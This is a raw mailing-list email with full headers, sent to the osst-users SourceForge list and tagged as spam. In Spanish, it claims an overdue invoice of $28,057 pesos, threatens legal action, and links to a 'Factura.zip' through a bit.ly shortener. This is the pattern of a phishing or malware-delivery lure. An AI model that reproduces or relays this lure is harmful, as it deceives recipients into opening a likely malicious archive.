Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 8AB61E2A77
	for <lists+osst-users@lfdr.de>; Thu, 24 Oct 2019 08:35:40 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1iNWih-0007zu-Bl
	for lists+osst-users@lfdr.de; Thu, 24 Oct 2019 06:35:39 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <dpjuridico@imail.travcobhs.com>) id 1iNWig-0007zo-Lq
 for osst-users@lists.sourceforge.net; Thu, 24 Oct 2019 06:35:38 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Date:Message-Id:Content-Type:To:From:
 MIME-version:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=Yc4Xp8bZif1K1fnq3gJofUBFvtBk3B+iwHC/FIbIWJk=; b=NpGxuErDHEHtOjDr6NKhbX7AC4
 c3n0M3blPZOmuHXdw8k1qjZRn5oq2dzmmq94gS0TsITOzXKJYdH4xstsZtPoO6KnruWeIrGl4e+7E
 SpPb58IVNh0jQmdBNFjSziko+ZXsO1z0bcQRhWE6A4WxpYW9llV4+5u23PyvssV7HXbU=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Date:Message-Id:Content-Type:To:From:MIME-version:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=Yc4Xp8bZif1K1fnq3gJofUBFvtBk3B+iwHC/FIbIWJk=; b=R
 E69rNQ53OxEvTI/LcL8Mp0811HHeT7jKxFPEpcRyiqjn48oL521bPnr+vNtv7pzL4OPVS81K6i/rQ
 2xkXXlcBQTHaPeX04Tufk5LapiRrKvEbYl+4yHpfibWicALiAd+rjM0qMvfJtIroB2GLhnqoNzEMk
 5/8PM/8MixDOL9O0=;
Received: from [24.154.8.139] (helo=imail.travcobhs.com)
 by sfi-mx-4.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
 id 1iNWia-001CMl-44
 for osst-users@lists.sourceforge.net; Thu, 24 Oct 2019 06:35:38 +0000
Received: from imail.travcobhs.com (localhost.localdomain [127.0.0.1])
 by imail.travcobhs.com (Postfix) with ESMTPS id B58022020EF67
 for <osst-users@lists.sourceforge.net>; Thu, 24 Oct 2019 02:35:25 -0400 (EDT)
Received: from imail.travcobhs.com (localhost.localdomain [127.0.0.1])
 by imail.travcobhs.com (Postfix) with ESMTPS id A19412020EF46
 for <osst-users@lists.sourceforge.net>; Thu, 24 Oct 2019 02:35:25 -0400 (EDT)
Received: from localhost (unknown [181.112.152.21])
 by imail.travcobhs.com (Postfix) with ESMTPSA id 5F2D02020EF67
 for <osst-users@lists.sourceforge.net>; Thu, 24 Oct 2019 02:35:25 -0400 (EDT)
MIME-version: 1.0
charset: UTF-8
From: "Mario Abogados" <dpjuridico@imail.travcobhs.com>
To: <osst-users@lists.sourceforge.net>
Message-Id: <20191024063525.5F2D02020EF67@imail.travcobhs.com>
Date: Thu, 24 Oct 2019 02:35:25 -0400 (EDT)
X-Spam-Score: 8.5 (++++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: bit.ly]
 1.5 RCVD_IN_PSBL           RBL: Received via a relay in PSBL
 [181.112.152.21 listed in psbl.surriel.com]
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 1.0 RDNS_NONE Delivered to internal network by a host with no rDNS
 0.6 HTML_MIME_NO_HTML_TAG  HTML-only message, but there is no HTML tag
 0.0 LOTS_OF_MONEY          Huge... sums of money
 2.0 SHORT_SHORTNER Short body with little more than a link to a shortener
 0.1 AWL AWL: Adjusted score from AWL reputation of From: address
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1iNWia-001CMl-44
Subject: [Osst-users] [SPAM] Saldo pendiente.
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
Content-Type: multipart/mixed; boundary="===============6168569356905176536=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============6168569356905176536==
Content-Type: text/html

Estimado cliente,
<br><br>
La factura folio 03436838 cuenta con un adeudo vencido por $28,057.00 pesos,
<br>
de no ser pagada passara al Departamento Juridico.
<br><br>
Quedo a sus ordenes para cualquier aclaracion.
<br><br><br>
<b>Adjunto la factura: <a href="https://bit.ly/2W7gBod">Factura.zip</a></b>


--===============6168569356905176536==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============6168569356905176536==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============6168569356905176536==--
